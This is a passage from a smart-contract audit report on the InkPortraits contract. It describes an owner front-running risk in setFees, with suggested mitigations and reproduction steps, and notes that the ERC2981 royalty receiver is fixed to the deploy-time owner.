Fee and bonus rates are read inside returnPortrait at execution time and the owner setter has no delay. The owner (or whoever controls the owner key) can observe a pending return and front-run it with setFees(500, 500, 0): the returner pays 20,000 INK instead of 4,000 on a swarm return, or receives no bonus on an agent return, and the owner can restore defaults afterwards. The role is intended and the brief says rate changes are immediate, so this is recorded as a trust assumption rather than a bypass. Minimal mitigation without changing the bounds: a minPayout parameter on returnPortrait, or a short timelock on setFees. Reported by the permissions specialist; confirmed from the code.

**Reproduction**

Code path: returnPortrait line 215/219 reads bonusBps/baseFeeBps/agentFeeBps live; setFees line 230 writes them immediately within the bounds base <= 500, agent <= base, bonus <= 1000. State: released vault, bob owns swarm 10000, bonusPot = 0, defaults 100/50/500. Bob submits returnPortrait(10000) expecting 396,000 INK; owner front-runs with setFees(500, 500, 0). Expected (bob's view): 396,000. Actual: 380,000 INK, with no way for bob to bound the loss.

### 12. Info: ERC2981 royalty receiver is fixed to the constructor owner with no setter; ownership transfer cannot redirect royalties

`src/InkPortraits.sol:32`

```
        _setDefaultRoyalty(initialOwner, 500);
```

InkPortraits inherits ERC2981 but exposes no setDefaultRoyalty/deleteDefaultRoyalty wrapper, so the 5% royalty signal permanently names the deploy-time owner even after Ownable2Step handover. README discloses it. Recorded as an irreversible deployment decision: if the launch owner is a deployer key rather than the long-term treasury, marketplace royalties go to that key forever. Fix if undesired: an onlyOwner setDefaultRoyalty wrapper or a separate royalty-receiver constructor argument. Reported by two specialists; merged.

**Reproduction**

Code path: constructor line 32 _setDefaultRoyalty(initialOwner, 500); no other function calls _setDefaultRoyalty. Deploy InkPortraits(deployerEOA); transferOwnership(treasury) + acceptOwnership; royaltyInfo(0, 1 ether). Expected by operators: (treasury, 0.05 ether). Actual: (deployerEOA, 0.05 ether), unchangeable.

---

Judge's submission `ecfb52b7eea570202748c2642163d0e6189c5c35ee6a6b00194f75c5cebec61e`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
